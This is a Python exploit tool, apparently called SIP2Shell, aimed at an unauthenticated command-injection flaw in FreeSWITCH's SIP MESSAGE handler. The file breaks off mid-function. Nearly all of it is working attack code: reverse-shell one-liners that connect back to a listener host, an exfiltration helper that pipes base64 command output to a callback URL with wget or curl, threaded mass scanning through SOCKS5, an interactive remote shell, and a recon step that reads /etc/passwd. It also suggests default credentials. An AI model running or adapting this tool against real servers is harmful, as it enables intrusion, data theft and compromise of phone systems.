#!/usr/bin/env python3
"""
SIP2Shell - unauthenticated RCE on FreeSWITCH through a single SIP MESSAGE.

CVE-2026-116779 (GHSA-mg63-h38w-8p9p) - CVSS 9.8, CISA KEV, exploited in the
wild. FreeSWITCH's inbound MESSAGE handler splits the To user on the first '+'
and uses the left side as a chat protocol selector, with no allow-list. The
'api' chat proto registered by mod_dptools hands the right side straight to
switch_api_execute(). So this address line runs an OS command:

    MESSAGE sip:api+system%20id@target SIP/2.0

and FreeSWITCH messages the output straight back to the sender, making it a
read-back shell with no out-of-band server required.

Fixed in 1.11.3 (a new enable-chat-api-proto gate, off by default). Everything
before 1.11.3 is affected on the stock profiles.

Same shape as Comment2Shell: one file, Python 3.8+, standard library only.
Commands: scan, probe, exploit, shell, info. A real Docker lab (vulnerable +
patched) ships in lab/.

Authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import queue
import random
import re
import socket
import string
import struct
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

__version__ = "0.1.0"
CVE = "CVE-2026-116779"
GHSA = "GHSA-mg63-h38w-8p9p"
DEFAULT_PORT = 5060
DEFAULT_LOCAL_PORT = 50842
DEFAULT_TIMEOUT = 6.0
UA = f"SIP2Shell/{__version__}"

# Reverse-shell presets fired as separate MESSAGEs (one command per To-user).
REVSHELLS = [
    ("bash", "bash -c 'bash -i >& /dev/tcp/{h}/{p} 0>&1'"),
    ("nc", "rm -f /tmp/.x;mkfifo /tmp/.x;cat /tmp/.x|/bin/sh -i 2>&1|nc {h} {p} >/tmp/.x"),
    ("python3", "python3 -c 'import socket,subprocess,os;"
                "s=socket.socket();s.connect((\"{h}\",{p}));"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
]


# --------------------------------------------------------------------------
# terminal helpers
# --------------------------------------------------------------------------
def _tty() -> bool:
    return sys.stdout.isatty() and not os.environ.get("NO_COLOR")


def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _tty() else text


def acid(t: str) -> str:
    return _c("38;5;154", t)


def violet(t: str) -> str:
    return _c("38;5;135", t)


def red(t: str) -> str:
    return _c("38;5;204", t)


def dim(t: str) -> str:
    return _c("2", t)


def bold(t: str) -> str:
    return _c("1", t)


def log(msg: str) -> None:
    sys.stderr.write(msg + "\n")


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------
def local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


def rand_token(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _branch() -> str:
    return "z9hG4bK" + rand_token(12)


def strip_port(spec: str) -> tuple[str, int]:
    spec = spec.strip()
    spec = re.sub(r"^sip:", "", spec)
    spec = re.sub(r"^udp://", "", spec)
    spec = re.sub(r"^tcp://", "", spec)
    host, _, port = spec.partition(":")
    try:
        p = int(port) if port else DEFAULT_PORT
    except ValueError:
        p = DEFAULT_PORT
    return host.strip(), p


# --------------------------------------------------------------------------
# SOCKS5 (TCP only; a SOCKS5 CONNECT proxy cannot carry SIP/UDP)
# --------------------------------------------------------------------------
class Socks5Error(Exception):
    pass


def parse_proxy(url: str) -> dict:
    raw = url.strip()
    for scheme in ("socks5h://", "socks5://", "socks://"):
        if raw.startswith(scheme):
            raw = raw[len(scheme):]
            break
    user = password = ""
    if "@" in raw:
        cred, raw = raw.rsplit("@", 1)
        user, _, password = cred.partition(":")
    if ":" not in raw:
        raise Socks5Error("proxy must be host:port")
    host, _, port = raw.rpartition(":")
    if not port.isdigit():
        raise Socks5Error("bad proxy port")
    return {"host": host, "port": int(port), "user": user, "password": password}


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise Socks5Error("proxy closed during negotiation")
        buf += chunk
    return buf


def socks5_connect(proxy: dict, host: str, port: int,
                   timeout: float) -> socket.socket:
    sock = socket.create_connection((proxy["host"], proxy["port"]), timeout=timeout)
    sock.settimeout(timeout)
    try:
        methods = [0x00] + ([0x02] if proxy["user"] else [])
        sock.sendall(bytes([0x05, len(methods)] + methods))
        ver, chosen = _recv_exact(sock, 2)
        if ver != 0x05:
            raise Socks5Error("not a SOCKS5 proxy")
        if chosen == 0x02:
            u = proxy["user"].encode()
            pw = proxy["password"].encode()
            sock.sendall(bytes([0x01, len(u)]) + u + bytes([len(pw)]) + pw)
            _v, status = _recv_exact(sock, 2)
            if status != 0x00:
                raise Socks5Error("proxy rejected credentials")
        elif chosen != 0x00:
            raise Socks5Error("no acceptable SOCKS5 method")
        try:
            atyp, addr = 0x01, socket.inet_aton(host)
        except OSError:
            try:
                atyp, addr = 0x04, socket.inet_pton(socket.AF_INET6, host)
            except OSError:
                enc = host.encode()
                atyp, addr = 0x03, bytes([len(enc)]) + enc
        sock.sendall(bytes([0x05, 0x01, 0x00, atyp]) + addr + struct.pack("!H", port))
        _v, rep, _rsv, rat = _recv_exact(sock, 4)
        if rat == 0x01:
            _recv_exact(sock, 4)
        elif rat == 0x04:
            _recv_exact(sock, 16)
        elif rat == 0x03:
            _recv_exact(sock, _recv_exact(sock, 1)[0])
        _recv_exact(sock, 2)
        if rep != 0x00:
            raise Socks5Error("SOCKS5 CONNECT failed (rep=%d)" % rep)
        return sock
    except Exception:
        sock.close()
        raise


# --------------------------------------------------------------------------
# SIP
# --------------------------------------------------------------------------
class SipError(Exception):
    pass


def _quote_user(value: str) -> str:
    # encode everything except unreserved; '+' must survive literally only as
    # the proto separator, so any '+' inside the command is %2B.
    return urllib.parse.quote(value, safe="")


def sip_message(method: str, host: str, port: int, to_user: str, lhost: str,
                lport: int, udp: bool = True, body: bytes = b"",
                ctype: str | None = None, callid: str | None = None,
                cseq: int = 1, extra: dict | None = None) -> bytes:
    transport = "UDP" if udp else "TCP"
    callid = callid or rand_token(16) + "@" + lhost
    tag = rand_token(8)
    lines = [
        f"{method} sip:{to_user}@{host}:{port} SIP/2.0",
        f"Via: SIP/2.0/{transport} {lhost}:{lport};branch={_branch()};rport",
        "Max-Forwards: 70",
        f"From: <sip:s2s@{lhost}:{lport}>;tag={tag}",
        f"To: <sip:{to_user}@{host}>",
        f"Call-ID: {callid}",
        f"CSeq: {cseq} {method}",
        f"Contact: <sip:s2s@{lhost}:{lport}>",
        f"User-Agent: {UA}",
        "Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, MESSAGE, INFO",
    ]
    for k, v in (extra or {}).items():
        lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Type: {ctype or 'text/plain'}")
    lines.append(f"Content-Length: {len(body)}")
    msg = "\r\n".join(lines) + "\r\n\r\n"
    return msg.encode("utf-8", "replace") + body


def parse_message(data: bytes) -> dict:
    head, _, body = data.partition(b"\r\n\r\n")
    text = head.decode("utf-8", "replace")
    lines = text.split("\r\n")
    start = lines[0] if lines else ""
    headers: dict = {}
    for line in lines[1:]:
        if line[:1] in (" ", "\t") and headers:      # RFC 3261 folded header
            last = list(headers)[-1]
            headers[last][-1] += " " + line.strip()
            continue
        if ":" in line:
            k, v = line.split(":", 1)
            headers.setdefault(k.strip().lower(), []).append(v.strip())
    status = None
    m = re.match(r"SIP/2\.0 (\d{3}) ?(.*)", start)
    if m:
        status = int(m.group(1))
    return {"start": start, "status": status, "headers": headers, "body": body}


# --------------------------------------------------------------------------
# out-of-band exfil (read-back needs a registered user; OOB always works)
# --------------------------------------------------------------------------
class _OobHandler(BaseHTTPRequestHandler):
    server_version = "sip2shell-oob"

    def log_message(self, *_a):
        pass

    def do_GET(self):  # noqa: N802
        parts = self.path.lstrip("/").split("/", 1)
        token = parts[0] if parts else ""
        data = parts[1] if len(parts) > 1 else ""
        if token == self.server.token:  # type: ignore[attr-defined]
            try:
                raw = base64.b64decode(data.translate(_UNB64) + "=" * (-len(data) % 4))
                self.server.events.put(  # type: ignore[attr-defined]
                    ("output", raw.decode("utf-8", "replace")))
            except Exception:
                self.server.events.put(("raw", data))  # type: ignore[attr-defined]
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")


_UNB64 = str.maketrans("-_", "+/")


class Oob:
    """Ephemeral HTTP callback server for command output."""

    def __init__(self, host: str | None = None, port: int = 0, base: str | None = None):
        self.token = rand_token(6)
        self.events: "queue.Queue[tuple[str, str]]" = queue.Queue()
        self.httpd = ThreadingHTTPServer((host or "0.0.0.0", port), _OobHandler)
        self.httpd.token = self.token          # type: ignore[attr-defined]
        self.httpd.events = self.events        # type: ignore[attr-defined]
        self.port = self.httpd.server_address[1]
        self.advertise = host or local_ip()
        self.base = base.rstrip("/") if base else None

    def start(self) -> "Oob":
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        return self

    def url(self) -> str:
        if self.base:
            return f"{self.base}/{self.token}"
        return f"http://{self.advertise}:{self.port}/{self.token}"

    def wait(self, timeout: float):
        try:
            return self.events.get(timeout=timeout)
        except queue.Empty:
            return None

    def close(self) -> None:
        try:
            self.httpd.shutdown()
        except OSError:
            pass


def exfil_command(cmd: str, urlbase: str) -> str:
    """A POSIX shell command that runs ``cmd`` and ships base64 stdout OOB.

    Reads back over HTTP; picks whichever client exists (wget/curl/busybox) so
    it survives minimal FreeSWITCH appliances. base64 stays URL-path-safe.
    """
    pipe = (f"( {cmd} ) 2>&1 | "
            "( base64 -w0 || busybox base64 || openssl base64 -A ) | tr -d '\\n'")
    u = f"{urlbase}/$( {pipe} )"
    return ('U="' + u + '";'
            'wget -q -O- "$U" 2>/dev/null||curl -s "$U" 2>/dev/null||'
            'busybox wget -q -O- "$U"')


class SipClient:
    def __init__(self, lhost: str | None = None, lport: int = DEFAULT_LOCAL_PORT,
                 udp: bool = True, timeout: float = DEFAULT_TIMEOUT,
                 user: str | None = None, password: str | None = None,
                 proxy: dict | None = None):
        self.lhost = lhost or local_ip()
        self.proxy = proxy
        self.lport = lport
        self.udp = udp
        self.timeout = timeout
        self.user = user
        self.password = password
        self.sock: socket.socket | None = None
        self._buf = b""
        self._connected = False

    # -- lifecycle ---------------------------------------------------------
    def open(self) -> None:
        if self.udp and self.proxy:
            raise SipError("SOCKS5 is TCP only; add --tcp")
        if self.udp:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind(("0.0.0.0", self.lport))
            s.settimeout(self.timeout)
            self.sock = s
            try:
                self.lport = s.getsockname()[1]
            except OSError:
                pass
        # TCP connects lazily (exchange knows the peer).

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
        self.sock = None
        self._connected = False

    def _connect(self, host: str, port: int) -> None:
        if self.udp or self._connected:
            return
        if self.proxy:
            self.sock = socks5_connect(self.proxy, host, port, self.timeout)
        else:
            self.sock = socket.create_connection((host, port), timeout=self.timeout)
        self.sock.settimeout(self.timeout)
        self._connected = True

    # -- io ----------------------------------------------------------------
    def send(self, data: bytes, host: str, port: int) -> None:
        self._connect(host, port)
        if not self.sock:
            raise SipError("not open")
        if self.udp:
            self.sock.sendto(data, (host, port))
        else:
            self.sock.sendall(data)

    def _tcp_message(self, timeout: float) -> bytes | None:
        """Read exactly one framed SIP message from the TCP stream."""
        assert self.sock
        self.sock.settimeout(timeout)
        while True:
            if b"\r\n\r\n" in self._buf:
                head, _, rest = self._buf.partition(b"\r\n\r\n")
                clen = 0
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        try:
                            clen = int(line.split(b":", 1)[1].strip())
                        except ValueError:
                            clen = 0
                if len(rest) >= clen:
                    self._buf = rest[clen:]
                    return head + b"\r\n\r\n" + rest[:clen]
            try:
                chunk = self.sock.recv(65535)
            except socket.timeout:
                return None
            except OSError:
                return None
            if not chunk:
                return None
            self._buf += chunk

    def recv_message(self, timeout: float | None = None) -> bytes | None:
        t = self.timeout if timeout is None else timeout
        if self.udp:
            if not self.sock:
                return None
            self.sock.settimeout(t)
            try:
                data, _ = self.sock.recvfrom(65535)
            except (socket.timeout, OSError):
                return None
            return data
        return self._tcp_message(t)

    def exchange(self, method: str, host: str, port: int, to_user: str,
                 body: bytes = b"", ctype: str | None = None,
                 timeout: float | None = None, want_reply: bool = True) -> dict:
        """Send one request and read until final response (and chat reply)."""
        callid = rand_token(16) + "@" + self.lhost
        uri = f"sip:{to_user}@{host}:{port}"
        extra: dict = {}
        status = None
        reply = None
        headers: dict = {}
        deadline = time.time() + (timeout or self.timeout)
        resend = True
        while time.time() < deadline:
            if resend:
                self.send(sip_message(method, host, port, to_user, self.lhost,
                                      self.lport, udp=self.udp, body=body,
                                      ctype=ctype, callid=callid, cseq=1,
                                      extra=extra), host, port)
                resend = False
            data = self.recv_message(min(1.0, max(0.05, deadline - time.time())))
            if not data:
                continue
            m = parse_message(data)
            if m["status"] is not None:
                if m["status"] == 100:
                    continue
                if m["status"] in (401, 407) and self.user is not None:
                    hname = ("Proxy-Authorization" if m["status"] == 407
                             else "Authorization")
                    if hname not in extra:
                        d = _digest(m, method, uri, self.user, self.password or "")
                        if d:
                            extra[hname] = d
                            resend = True
                            continue
                status = m["status"]
                headers = m["headers"]
                if not want_reply:
                    return {"status": status, "reply": None, "headers": headers}
            else:
                self._ack(m, host, port)
                if m["start"].startswith("MESSAGE"):
                    reply = m["body"]
                    return {"status": status or 202, "reply": reply, "headers": headers}
        return {"status": status, "reply": reply, "headers": headers}

    def _ack(self, m: dict, host: str, port: int) -> None:
        callid = (m["headers"].get("call-id") or [rand_token()])[0]
        cseq = (m["headers"].get("cseq") or ["1 MESSAGE"])[0]
        try:
            self.send(f"SIP/2.0 200 OK\r\nCall-ID: {callid}\r\nCSeq: {cseq}\r\n"
                      f"Content-Length: 0\r\n\r\n".encode(), host, port)
        except OSError:
            pass


def _digest(resp: dict, method: str, uri: str, user: str, password: str) -> str | None:
    hdr = None
    for key in ("www-authenticate", "proxy-authenticate"):
        if key in resp["headers"]:
            hdr = resp["headers"][key][0]
            break
    if not hdr or "digest" not in hdr.lower():
        return None
    pairs = re.findall(r"(\w+)=(?:\"([^\"]*)\"|([^,]+))", hdr)
    fields = {k: (v or w).strip() for k, v, w in pairs}
    realm = fields.get("realm", "")
    nonce = fields.get("nonce", "")
    qop = fields.get("qop", "")
    opaque = fields.get("opaque")
    algorithm = fields.get("algorithm", "MD5")

    def h(x: str) -> str:
        return hashlib.md5(x.encode()).hexdigest()

    ha1 = h(f"{user}:{realm}:{password}")
    ha2 = h(f"{method}:{uri}")
    nc = "00000001"
    cnonce = rand_token(16)
    if "auth" in qop:
        response = h(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
    else:
        response = h(f"{ha1}:{nonce}:{ha2}")
    parts = [f'username="{user}"', f'realm="{realm}"', f'nonce="{nonce}"',
             f'uri="{uri}"', f'response="{response}"', f"algorithm={algorithm}"]
    if opaque:
        parts.append(f'opaque="{opaque}"')
    if "auth" in qop:
        parts += [f"qop=auth", f"nc={nc}", f'cnonce="{cnonce}"']
    return "Digest " + ", ".join(parts)


# --------------------------------------------------------------------------
# fingerprints / probe / exploit
# --------------------------------------------------------------------------
VERSION_RE = re.compile(r"(?:mod_sofia|mod_verto)[^\s/]*/(\d+\.\d+\.\d+)", re.I)
VERSION_RE2 = re.compile(r"FreeSWITCH.{0,60}?(\d+\.\d+\.\d+)", re.I | re.S)


def _fingerprint_from(resp: dict | None) -> str:
    if not resp:
        return ""
    blob = " ".join(v for vs in resp.get("headers", {}).values() for v in vs)
    blob += " " + (resp.get("body") or b"").decode("utf-8", "replace")[:200]
    return blob


def classify(resp: dict | None) -> str:
    if resp is None or resp.get("status") is None:
        return "unreachable"
    if resp["status"] == 403:
        return "patched"
    if resp["status"] in (401, 407):
        return "auth-required"
    if resp["status"] in (200, 202):
        return "vulnerable"
    if resp["status"] == 404:
        return "no-message-handler"
    return f"http-{resp['status']}"


def probe_target(host: str, port: int, timeout: float, udp: bool,
                 user: str | None = None, password: str | None = None,
                 lport: int = 0, lhost: str | None = None,
                 proxy: dict | None = None) -> dict:
    out = {"target": f"{host}:{port}", "open": False, "freeswitch": False,
           "version": None, "server": None, "verdict": "unknown",
           "confirmed": False, "output": "", "notes": []}
    cli = SipClient(lhost=lhost, lport=lport, udp=udp, timeout=timeout,
                    user=user, password=password, proxy=proxy)
    try:
        cli.open()
    except OSError as exc:
        out["notes"].append(str(exc))
        out["verdict"] = "socket-error"
        return out

    try:
        r = cli.exchange("OPTIONS", host, port, "sip2shell", timeout=timeout,
                         want_reply=False)
        if r["status"] is None:
            out["verdict"] = "unreachable"
            return out
        out["open"] = True
        blob = _fingerprint_from(r)
        out["server"] = (r["headers"].get("server") or [None])[0]
        if "freeswitch" in blob.lower():
            out["freeswitch"] = True
        m = VERSION_RE.search(blob) or VERSION_RE2.search(blob)
        if m:
            out["version"] = m.group(1)

        r = cli.exchange("MESSAGE", host, port, "api+version", body=b"probe",
                         ctype="text/plain", timeout=timeout)
        out["verdict"] = classify(r)
        if out["verdict"] == "vulnerable" and not (out["freeswitch"] or out["version"]):
            out["verdict"] = "api-accepted (unverified)"
        if r["reply"] is not None:
            body = r["reply"].decode("utf-8", "replace").strip()
            out["output"] = body
            mv = VERSION_RE.search(body) or VERSION_RE2.search(body)
            if mv:
                out["version"] = mv.group(1)
            out["confirmed"] = "FreeSWITCH" in body or bool(VERSION_RE.search(body))
            if out["confirmed"]:
                out["verdict"] = "confirmed"
    except (SipError, OSError) as exc:
        out["notes"].append(str(exc))
    finally:
        cli.close()
    return out


def run_remote(host: str, port: int, cmd: str, oob: Oob | None, timeout: float,
               udp: bool, user: str | None = None, password: str | None = None,
               lport: int = 0, lhost: str | None = None,
               proxy: dict | None = None) -> dict:
    """Run a shell command through api+system; read-back first, then OOB."""
    cli = SipClient(lhost=lhost, lport=lport, udp=udp, timeout=timeout,
                    user=user, password=password, proxy=proxy)
    cli.open()
    try:
        arg = "system " + (exfil_command(cmd, oob.url()) if oob else cmd)
        r = cli.exchange("MESSAGE", host, port, "api+" + _quote_user(arg),
                         body=b"x", ctype="text/plain", timeout=timeout)
        result = {"status": r["status"], "verdict": classify(r), "output": "", "ok": False}
        if r["reply"] is not None:                       # read-back (reaches From host)
            result["output"] = r["reply"].decode("utf-8", "replace")
            result["ok"] = True
        elif oob is not None and result["verdict"] == "vulnerable":
            ev = oob.wait(timeout)                       # out-of-band fallback
            if ev is not None:
                result["output"] = ev[1]
                result["ok"] = True
        return result
    finally:
        cli.close()


def blind(host: str, port: int, cmd: str, timeout: float, udp: bool,
          user: str | None = None, password: str | None = None,
          lport: int = 0, lhost: str | None = None,
          proxy: dict | None = None) -> dict:
    """Fire a command and only report whether the MESSAGE was accepted."""
    cli = SipClient(lhost=lhost, lport=lport, udp=udp, timeout=timeout,
                    user=user, password=password, proxy=proxy)
    cli.open()
    try:
        r = cli.exchange("MESSAGE", host, port,
                         "api+" + _quote_user("system " + cmd), body=b"x",
                         ctype="text/plain", timeout=timeout, want_reply=False)
        return {"status": r["status"], "verdict": classify(r)}
    finally:
        cli.close()


# --------------------------------------------------------------------------
# commands
# --------------------------------------------------------------------------
def collect_targets(args) -> list:
    raw = list(getattr(args, "target", None) or [])
    if getattr(args, "file", None):
        try:
            with open(args.file) as fh:
                raw += [ln.strip() for ln in fh
                        if ln.strip() and not ln.startswith("#")]
        except OSError as exc:
            log(red("[!] ") + f"cannot read {args.file}: {exc}")
    if not raw and not sys.stdin.isatty():
        raw += [ln.strip() for ln in sys.stdin if ln.strip()]
    seen, out = set(), []
    for item in raw:
        host, port = strip_port(item)
        if host and (host, port) not in seen:
            seen.add((host, port))
            out.append((host, port))
    return out


def _verdict_color(v: str) -> str:
    if v in ("vulnerable", "confirmed"):
        return red(v)
    if v in ("patched", "auth-required"):
        return violet(v)
    return dim(v)


def print_probe(res: dict) -> None:
    ok = res["verdict"] in ("vulnerable", "confirmed")
    mark = acid("RCE") if res["verdict"] == "confirmed" else \
        (red("VULN") if res["verdict"] == "vulnerable" else dim("----"))
    extra = ""
    if res.get("version"):
        extra = dim(" v" + res["version"])
    if res.get("server"):
        extra += dim("  " + res["server"][:32])
    print(f"  {mark} {res['target']:<24} {_verdict_color(res['verdict'])}{extra}")
    if res.get("output"):
        first = res["output"].strip().splitlines()[0] if res["output"].strip() else ""
        if first:
            print(dim(f"        reply: {first[:100]}"))
    for n in res.get("notes", []):
        print(dim(f"        - {n}"))


def cmd_scan(args) -> int:
    targets = collect_targets(args)
    if not targets:
        log(red("[!] no targets"))
        return 2
    log(violet("[*] ") + f"scanning {len(targets)} target(s) ({'udp' if not args.tcp else 'tcp'})")
    rows = []

    def work(t):
        host, port = t
        try:
            return probe_target(host, port, args.timeout, udp=not args.tcp,
                                user=args.user, password=args.password,
                                lport=0, lhost=args.lhost,
                                proxy=getattr(args, "proxy_obj", None))
        except Exception as exc:
            return {"target": f"{host}:{port}", "verdict": "error",
                    "notes": [str(exc)], "version": None, "server": None}

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        for res in pool.map(work, targets):
            rows.append(res)
            print_probe(res)

    hits = [r for r in rows if r["verdict"] in ("vulnerable", "confirmed")]
    conf = [r for r in rows if r["verdict"] == "confirmed"]
    log(bold(f"[=] {len(hits)} appear vulnerable, {len(conf)} confirmed, {len(rows)} total"))
    if args.json:
        blob = {"tool": "SIP2Shell", "version": __version__, "cve": CVE,
                "results": rows}
        text = json.dumps(blob, indent=2)
        if args.output:
            with open(args.output, "w") as fh:
                fh.write(text)
            log(dim(f"    wrote {args.output}"))
        else:
            print(text)
    return 0 if hits else 1


def cmd_probe(args) -> int:
    targets = collect_targets(args)
    if not targets:
        log(red("[!] no target"))
        return 2
    rc = 1
    for host, port in targets:
        res = probe_target(host, port, args.timeout, udp=not args.tcp,
                           user=args.user, password=args.password, lport=args.lport,
                           lhost=args.lhost, proxy=getattr(args, "proxy_obj", None))
        print_probe(res)
        if args.json:
            print(json.dumps(res, indent=2))
        if res["verdict"] in ("vulnerable", "confirmed"):
            rc = 0
    return rc


def cmd_exploit(args) -> int:
    targets = collect_targets(args)
    if not targets:
        log(red("[!] no target"))
        return 2
    host, port = targets[0]
    log(violet("[*] ") + f"target {host}:{port}")
    oob = None if args.no_oob else Oob(host=args.oob_ip, port=args.oob_port, base=args.oob_url).start()
    if oob:
        log(dim(f"    OOB listener on {oob.url()}"))
    kws = dict(timeout=args.timeout, udp=not args.tcp, user=args.user,
               password=args.password, lport=args.lport, lhost=args.lhost,
               proxy=getattr(args, "proxy_obj", None))
    try:
        res = {}
        for i in range(max(1, args.retries)):
            res = run_remote(host, port, args.cmd or "id", oob, **kws)
            if res.get("ok"):
                break
            if i + 1 < max(1, args.retries):
                log(dim(f"    retry {i + 2}/{args.retries}"))
        if not res.get("ok"):
            log(red("[!] ") + f"no callback (verdict {res['verdict']}, SIP {res['status']})")
            if res["verdict"] == "auth-required":
                log(dim("    try --user 1000 --password 1234"))
            elif res["verdict"] == "vulnerable":
                log(dim("    command ran but no callback - the target may not reach "
                        "--oob-ip"))
            return 1
        if args.json:
            print(json.dumps({"target": f"{host}:{port}", "ok": True,
                              "output": res["output"], "verdict": res["verdict"]}, indent=2))
        else:
            sys.stdout.write(res["output"] if res["output"].endswith("\n")
                             else res["output"] + "\n")
        if args.post:
            for c in ("hostname", "uname -a", "id", "cat /etc/passwd | head -5"):
                log(dim(f"    $ {c}"))
                r = run_remote(host, port, c, oob, **kws)
                sys.stdout.write(r.get("output", "") if r.get("output", "").endswith("\n")
                                 else r.get("output", "") + "\n")
    finally:
        if oob:
            oob.close()
    return 0


def cmd_shell(args) -> int:
    targets = collect_targets(args)
    if not targets:
        log(red("[!] no target"))
        return 2
    host, port = targets[0]
    oob = None if args.no_oob else Oob(host=args.oob_ip, port=args.oob_port, base=args.oob_url).start()
    if oob:
        log(dim(f"    OOB listener on {oob.url()}"))
    kws = dict(timeout=args.timeout, udp=not args.tcp, user=args.user,
               password=args.password, lport=args.lport, lhost=args.lhost)
    try:
        first = run_remote(host, port, "id", oob, **kws)
        if not first.get("ok"):
            log(red("[!] ") + f"no callback (verdict {first['verdict']})")
            if first["verdict"] == "auth-required":
                log(dim("    hint: stock creds are often 1000 / 1234 - pass them with "
                        "--user/--password"))
            return 1
        log(bold("SIP2Shell") + dim(" shell as the FreeSWITCH process - 'exit' to quit"))
        sys.stdout.write(first["output"] if first["output"].endswith("\n")
                         else first["output"] + "\n")
        while True:
            try:
                cmd = input(acid("s2s> ")).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if cmd in ("exit", "quit"):
                break
            if not cmd:
                continue
            r = run_remote(host, port, cmd, oob, **kws)
            sys.stdout.write(r.get("output", "") if r.get("output", "").endswith("\n")
                             else r.get("output", "") + "\n")
        return 0
    finally:
        if oob:
            oob.close()


def cmd_rev(args) -> int:
    targets = collect_targets(args)
    if not targets:
        log(red("[!] no target"))
        return 2
    host, port = targets[0]
    lh, _, lp = args.listen.rpartition(":")
    if not lh:
        lh, lp = args.listen, "4444"
    if not lp.isdigit():
        log(red("[!] --listen must be HOST:PORT"))
        return 2
    proxy = getattr(args, "proxy_obj", None)
    log(violet("[*] ") + f"firing reverse shells at {host}:{port} -> {lh}:{lp}")
    rc = 1
    for name, tpl in REVSHELLS:
        r = blind(host, port, tpl.format(h=lh, p=lp), timeout=args.timeout,
                  udp=not args.tcp, user=args.user, password=args.password,
                  lport=args.lport, lhost=args.lhost, proxy=proxy)
        print(f"  {name:<8} -> {r['status']} ({r['verdict']})")
        if r["status"] in (200, 202):
            rc = 0
    log(dim("    note: 2xx only means the MESSAGE was accepted; a shell is "
            "proven by your listener, not the SIP status."))
    return rc


def cmd_info(_a) -> int:
    print(bold("SIP2Shell") + dim(f" v{__version__}"))
    print()
    print(bold(CVE) + " - " + GHSA + dim("  CVSS 9.8, CISA KEV, in the wild"))
    print("  An inbound SIP MESSAGE whose To user starts with 'api+' selects the")
    print("  'api' chat proto; the remainder runs through switch_api_execute().")
    print("  So:  MESSAGE sip:api+system%20id@host  ->  OS command as the daemon.")
    print("  Output is messaged back to the sender (read-back, not blind).")
    print()
    print(bold("scope") + ": FreeSWITCH < 1.11.3 on stock internal/external profiles.")
    print(bold("fix") + ": 1.11.3 adds an enable-chat-api-proto gate (403 on api).")
    print(dim("  ~13.6k FreeSWITCH instances exposed; ~12k still < 1.11.3."))
    print()
    print(bold("lab") + ": cd lab && docker compose up  (1.10.12 vuln + 1.11.3 patched)")
    return 0


# --------------------------------------------------------------------------
# cli
# --------------------------------------------------------------------------
def banner() -> None:
    print(bold(acid("SIP2Shell")) + dim(f" v{__version__}  ") + f"({CVE})")
    print(dim("one SIP MESSAGE -> shell on FreeSWITCH, no deps"))
    print(dim("authorized testing only") + "\n")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="sip2shell",
        description=f"SIP2Shell - {CVE}: unauthenticated RCE on FreeSWITCH via a "
                    "SIP MESSAGE (api chat proto -> switch_api_execute).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s scan -f hosts.txt --json -o out.json
  %(prog)s probe -t 10.0.0.5
  %(prog)s exploit -t 10.0.0.5 -c "id" --post
  %(prog)s shell -t 10.0.0.5
  %(prog)s info

speaks UDP by default; --tcp for TCP SIP. no pip install. authorized only.
""",
    )
    sub = p.add_subparsers(dest="command")

    def common(sp, local_port=False):
        sp.add_argument("-t", "--target", action="append", help="host[:port] (repeatable)")
        sp.add_argument("-f", "--file", help="file of host[:port], one per line")
        sp.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
        sp.add_argument("--tcp", action="store_true", help="use TCP instead of UDP")
        sp.add_argument("--user", help="SIP user for digest auth (if challenged)")
        sp.add_argument("--password", help="SIP password for digest auth")
        sp.add_argument("--lport", type=int, default=0,
                        help="local source port (advertised for read-back)")
        sp.add_argument("--oob-ip", help="IP the target can call back to (default: auto)")
        sp.add_argument("--oob-port", type=int, default=0, help="OOB listener port")
        sp.add_argument("--oob-url",
                        help="public base URL for the callback (e.g. a tunnel)")
        sp.add_argument("--lhost", help="public IP to advertise so replies come back")
        sp.add_argument("--proxy", help="socks5://[user:pass@]host:port (forces TCP)")
        sp.add_argument("--retries", type=int, default=3,
                        help="retry a missed command (OOB can be flaky)")
        sp.add_argument("--no-oob", action="store_true",
                        help="rely on SIP read-back only (no OOB listener)")

    sc = sub.add_parser("scan", help="mass-scan many hosts")
    common(sc)
    sc.add_argument("--threads", type=int, default=32)
    sc.add_argument("--json", action="store_true")
    sc.add_argument("-o", "--output")

    pr = sub.add_parser("probe", help="fingerprint and test one host, safe")
    common(pr)
    pr.add_argument("--json", action="store_true")

    ex = sub.add_parser("exploit", help="run a command via api+system")
    common(ex)
    ex.add_argument("-c", "--cmd", default="id", help="command (default: id)")
    ex.add_argument("--post", action="store_true", help="run a short recon battery")
    ex.add_argument("--json", action="store_true")

    sh_p = sub.add_parser("shell", help="interactive read-back shell")
    common(sh_p)

    rv = sub.add_parser("rev", help="fire reverse-shell payloads (blind)")
    common(rv)
    rv.add_argument("--listen", required=True, help="your listener HOST:PORT")

    sub.add_parser("info", help="print the vulnerability summary")
    p.add_argument("--version", action="version",
                   version=f"SIP2Shell {__version__} ({CVE})")
    return p


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    args.proxy_obj = None
    if getattr(args, "proxy", None):
        try:
